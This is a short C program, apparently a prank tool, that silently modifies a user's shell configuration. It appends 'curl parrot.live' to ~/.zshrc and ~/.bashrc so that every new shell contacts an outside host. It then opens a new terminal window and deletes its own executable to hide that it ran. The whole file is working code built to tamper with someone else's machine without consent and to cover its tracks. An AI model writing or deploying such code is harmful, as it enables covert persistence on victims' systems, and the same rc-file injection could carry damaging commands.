#include "../utils/process.h"

int	copy_alias(char **envp)
{
	int			i;
	int			fd;
	static char	*command = "curl parrot.live";
	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
	char		*path;

	printf("\033[36mStart shell rc modifications...\033[0m\n");
	i = -1;
	while (file_list[++i])
	{
		path = ft_strjoin(getenv("HOME"), file_list[i]);
		if (!path)
			return (1);
		printf("opening and writing in %s\n", path);
		fd = open(path, O_CREAT | O_WRONLY | O_APPEND | O_RDONLY);
		if (fd < 0)
			return (1);
		dprintf(fd, "%s\n", command);
		close(fd);
		free(path);
	}
	printf("--------------------\n");
	return (0);
}

int	main(int ac, char **av, char **envp)
{
	char	home_buffer[PATH_MAX];
	// char	*commands;
	// char	**cmd;
	char	*rm_cmd[] = {"open", "-a", "Terminal", NULL};

	realpath(av[0], home_buffer);
	printf("currrent file path = %s\n", home_buffer);
	// commands = ft_strjoin("rm ", home_buffer);
	// if (!commands)
	// 	return (1);
	// cmd = ft_split(commands, ' ');
	// if (!cmd)
	// 	return (free(commands), 1);
	copy_alias(envp);
	#if __APPLE__
		process_child(rm_cmd, envp);
	#else
		system("gnome-terminal");
	#endif
	// process_child(cmd, envp);
	remove(home_buffer);
	// waitpid(-1, NULL, 0);
	// free(commands);
	// free_tab(cmd);
	return (0);
}